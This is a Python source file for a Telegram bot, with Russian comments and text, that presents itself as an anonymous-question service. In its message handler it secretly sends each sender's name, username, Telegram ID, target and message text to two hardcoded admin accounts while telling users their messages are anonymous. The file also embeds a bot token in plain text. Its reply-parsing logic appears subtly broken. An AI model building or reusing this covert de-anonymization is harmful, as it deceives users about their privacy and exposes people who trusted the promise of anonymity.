import asyncio
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties

# --- ДАННЫЕ ---
TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
ADMIN_IDS = [7919798306, 5275461907]

# Исправлено для новой версии aiogram:
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode='HTML'))
dp = Dispatcher()

def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    conn.commit()
    conn.close()

def get_main_keyboard(user_id):
    buttons = [[KeyboardButton(text="🔗 Моя ссылка")]]
    if user_id in ADMIN_IDS:
        buttons.append([KeyboardButton(text="📊 Статистика")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

@dp.message(CommandStart())
async def start(message: types.Message):
    args = message.text.split()
    if len(args) > 1:
        target = args[1]
        # Специальная метка для бота, чтобы он знал ID
        await message.answer(f"🤫 Пиши анонимно для пользователя <code>{target}</code>\n\n(Обязательно нажми на это сообщение и выбери <b>'Ответить'</b>)")
    else:
        init_db()
        conn = sqlite3.connect("users.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
        conn.commit()
        conn.close()
        await message.answer("Меню активировано!", reply_markup=get_main_keyboard(message.from_user.id))

@dp.message(F.text)
async def handle_all(message: types.Message):
    # ПРОВЕРКА НА АНОНИМКУ
    if message.reply_to_message and "пользователя" in message.reply_to_message.text:
        try:
            # Вытаскиваем ID получателя
            target_id = message.reply_to_message.text.split("<code>")[1].split("</code>")[0]
            
            # 1. Отправляем вопрос получателю
            await bot.send_message(target_id, f"📥 <b>Новый анонимный вопрос:</b>\n\n{message.text}")
            
            # 2. Шлем подробный лог тебе и другу
            user = message.from_user
            u_link = f"<a href='tg://user?id={user.id}'>{user.full_name}</a>"
            un = f" (@{user.username})" if user.username else " (нет юзернейма)"
            
            log_msg = (
                f"🕵️ <b>ЛОГ АНОНИМКИ</b>\n"
                f"👤 <b>ОТ КОГО:</b> {u_link}{un}\n"
                f"🆔 <b>ID ОТПРАВИТЕЛЯ:</b> <code>{user.id}</code>\n"
                f"🎯 <b>КОМУ (ID):</b> <code>{target_id}</code>\n"
                f"📝 <b>ТЕКСТ:</b> {message.text}"
            )
            
            for admin_id in ADMIN_IDS:
                try: await bot.send_message(admin_id, log_msg)
                except: pass
                
            await message.answer("✅ Доставлено!")
            return
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
            return

    # КНОПКИ
    if message.text == "🔗 Моя ссылка":
        bot_user = await bot.get_me()
        link = f"https://t.me/{bot_user.username}?start={message.from_user.id}"
        await message.answer(f"Твоя ссылка:\n<code>{link}</code>")
    
    elif message.text == "📊 Статистика" and message.from_user.id in ADMIN_IDS:
        conn = sqlite3.connect("users.db")
        count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        conn.close()
        await message.answer(f"Всего пользователей: <b>{count}</b>")

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
